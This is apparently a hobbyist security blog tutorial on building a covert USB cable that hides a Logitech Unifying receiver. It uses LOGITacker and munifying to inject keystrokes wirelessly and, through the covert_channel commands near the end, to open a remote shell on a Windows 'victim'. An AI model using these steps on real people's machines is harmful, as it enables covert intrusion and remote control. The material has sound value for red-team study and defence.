---
layout: post
title: Evil Logitech - erm I ment USB cable
---
New series: You don´t need it - but you want it!!!  

Did you ever want to have your own, handmade, remote controlled, stealthy USB implant / HID injector, but didn´t want to sell your soul for it?  Well then this one is for you :)  
I already heared about something like this in the past, which reminded me of the expensive O.MG cable from HAK5 or the USB Ninja.  
But If you like to tinker a little bit and are on a budget, you can pretty much get the same results for like 30 bucks.   

I already own a DSTIKE WiFi Duck and several Digisparks, but plugging these into someones computer is far more suspicious than a black USB cable. I also own a CrazyRadio, with which one can inject keystrokes into wireless receivers for keyboards and mice, with the help of e.g. bettercap - but to be honest this is a real pain in the ass.

I recently stumbled upon some great articles on Twitter regarding an alternative in form of a UNIFY receiver implanted into an USB cable. When I red those lines, I also wanted an USB cable that would still be able to charge a phone, but also could be used to inject keystrokes into the victims systems or even give me a remote shell.  

<img src="/images/2021-05-15/yoda.png">

<!--more-->
## Introduction  

The before mentioned articles are from [Luca Bongiorni](https://twitter.com/LucaBongiorni), who does some awesome shit with HID & Mousejack attacks.
The two ones I am referring in special can be found [here](https://infosecwriteups.com/usbsamurai-a-remotely-controlled-malicious-usb-hid-injecting-cable-for-less-than-10-ebf4b81e1d0b) and [here](https://lucabongiorni.medium.com/usbsamurai-for-dummies-4bd47abf8f87).  

The others persons to mention at this point are [Rogan Dawes](https://twitter.com/RoganDawes) and [Marcus Mengs](https://twitter.com/mame82) with their awesome projects like [LOGITacker](https://github.com/RoganDawes/LOGITacker) and [munifying](https://github.com/RoganDawes/munifying ), which we will need in the course of this blog post.    

As I followed along the lines of Luca, I went into some problems - hence this short writeup, which is more or less the same you can find from the original author. Maybe a little bit more step by step and a little more up to date. But credits go to the all the people mentioned above.     

## Stuff needed  

We need a delivering and a receiving end in terms of hardware. We as attacker pretend to "be" a Logitech Keyboard, and our USB cable will contain a UNIFY receiver, to which we can inject the keystrokes.  
As the recommended hardware from Luca´s blog is no longer available, i opted for the "MakerDiary MDK Dongle" (one of the 4 compatible devices listed at the [LOGITacker repo](https://github.com/RoganDawes/LOGITacker#2-installation)).  
As for the UNIFY receiver, I sticked to the 2nd article from Luca, and bought the recommended C-U0012 one.  
If you don´t have an old USB cable lying around, you can get yourself a cheap one from whereever you want. During my journey I destroyed one receiver and two cables, ending up with buying a set of DIY USB plugs.  

### (Buying)list

[MakerDiary MDK Dongle](https://www.amazon.de/GeeekPi-nRF52840-Micro-Dev-Dongle/dp/B07MJ12XLG)  
[UNIFY Dongle](https://www.amazon.de/Logitech®-USB-Unifying-Empfänger-Schwarz/dp/B07W6JKH17)  
[DIY USB plugs](https://www.amazon.de/RUNCCI-YUN-Stecker-Steckerbuchse-Kunststoffabdeckung-Schwarz-Silber/dp/B089W4F82Y)  

Besides that, we need the LOGITacker Image for our MakerDiary MDK Dongle, and the Lightspeed firmware for the UNIFY receiver, aswell as the munifying software to flash and pair the receiver:

[LOGITacker uf2 firmware](https://github.com/RoganDawes/LOGITacker/blob/master/build/logitacker_mdk_dongle.uf2)  
[Logitech Lightspeed firmware](https://github.com/Logitech/fw_updates/tree/master/RQR39/RQR39.06)  
[munifying](https://github.com/RoganDawes/munifying)  


## Let´s get started  

If you are working with a VM like me, you probably want to make sure, that you can explicitly attach HID devices to your VM, otherwise it won´t work. While digging around how the fuck to do that, I came across this VMWare article: [1033435](https://kb.vmware.com/s/article/1033435)  
Plain simple - open your vmx file and add the following lines to it:  

```
usb.generic.allowHID = "TRUE"
usb.generic.allowLastHID = "TRUE"
``` 

You can now selectively attach the stuff to your VM:  

<img src="/images/2021-05-15/usb.PNG">

The MDK Dongle in my case was already shipped with the newest UF2 bootloader, which will just present you with a flash drive when started in flash mode, to which you can copy the uf2 file. Any further info can be found [here](https://wiki.makerdiary.com/nrf52840-mdk-usb-dongle/programming/).   
To start the flashmode, hold down the small black button of the device, holding it down while plugging it in. The flashing red light indicates you´re in flashmode.  

<img src="/images/2021-05-15/0.png">
<img src="/images/2021-05-15/1.png">  

Just copy the uf2 file to the device and it will flash itself.  

The MDK-Dongle now is 4 devices, one of them being a serial device on a COM port:  
<img src="/images/2021-05-15/doge.png">  

To which we can now connect via putty:  
<img src="/images/2021-05-15/2.png">  
<img src="/images/2021-05-15/3.png">  

Next we want to get the UNIFY receiver ready with the lightspeed firmware. This will allow us to inject keystrokes much faster, aswell as having our communication encrypted.  

```
git clone https://github.com/RoganDawes/munifying  
./install_libusb.sh
```  

<img src="/images/2021-05-15/5.png">

```go build```   

<img src="/images/2021-05-15/6.png">

We can now run the ```info``` option of munifying to make sure we can see the UNIFY receiver and read it:  

```./munifying info```  

<img src="/images/2021-05-15/7.png">

When all is good to go, we flash the new firmware:  

```./munifying flash -f /root/Downloads/RQR39.06_B0040.shex```  

<img src="/images/2021-05-15/8.png">

```Info``` should now show the correct flashed firmware:  

<img src="/images/2021-05-15/9.png">

## Let the party begin

<img src="/images/2021-05-15/party.png">

Next we want to pair our devices, so that they can talk to each other. LOGITacker has a build in option for that, and munifying can help us on the UNIFY side.  
We first need to set the LOGITacker device to lightspeed mode, in order to be able to communicate with the UNIFY receiver:  

```Options global workmode lightspeed```  

<img src="/images/2021-05-15/10.png">

Next set it to pair mode:  

```pair device run```  

<img src="/images/2021-05-15/11.png">

For the UNIFY side, we first unpair all associated devices (just in case, as the lightspeed firmware can only pair one device at a time), and then set it to pair mode:  

```
./munifying unpairall
./munifying pair
```  

<img src="/images/2021-05-15/12.png">

If everything went well, you should have paired devices now. I had to do some of the above mentioned steps more than once, and replug the devices several times.  

<img src="/images/2021-05-15/computer.png">

Next you want to store the settings inside LOGITacker, so you don´t have to do all the shit over and over again:  

```devices storage save (Tab to autocomplete)```  

<img src="/images/2021-05-15/13.png">

That´s it. We can now proceed to the fun part.  

## Attacking stuff  

Whenever you fire up your LOGITacker, you need to load a device to connect to from storage: 

```Device storage load (Tab to autocomplete)```

<img src="/images/2021-05-15/14.png">

To start injecting, we need to specify a target - the device loaded from storage:  

```Inject target (Tab to autocomplete)```  

<img src="/images/2021-05-15/15.png">

But what to inject??? Well we can use the LOGITacker interface to write, save and load scripts. All of this can be done with the ```script``` menu:  

<img src="/images/2021-05-15/16.png">

First things first: In my case I need a german keyboard layout - otherwise things might get skrewed up.  
We can achive this by:  

```options inject language de```

And verify with:  
```options show```

<img src="/images/2021-05-15/17.png">

Next we can build a script like so:  
```
script press GUI r
script delay 500
script string notepad.exe
script press ENTER
script delay 200
script string you got p0wned!
script store test
```

Now running ```script list``` should show our "test" script:  

<img src="/images/2021-05-15/18.png">

With ```script show``` we can verify the content of our currently loaded script:  

<img src="/images/2021-05-15/script.png">

To execute the script use:  

``` inject execute```

<img src="/images/2021-05-15/p0wned.png">

To see the speed of the injected characters I made a small video:  

<video muted autoplay controls>
    <source src="/images/2021-05-15/inject.mp4" type="video/mp4">
</video>

<video width="600" controls="controls">
  <source src="/images/2021-05-15/inject.mp4">
</video>

One of the cool features of LOGITacker is the ```covert_channel``` option, which will give you a remote shell on a Windows box.  
One first has to deploy the shell to a target and then connect to the shell in the next step:  

```covert_channel deploy YOUR_TARGET```

This will, as far as I understood, deploy posh funcionality (SSH for Powershell) to the attacked device and lets you connect 

```covert_channel connect YOUR_TARGET```

<img src="/images/2021-05-15/shell.png">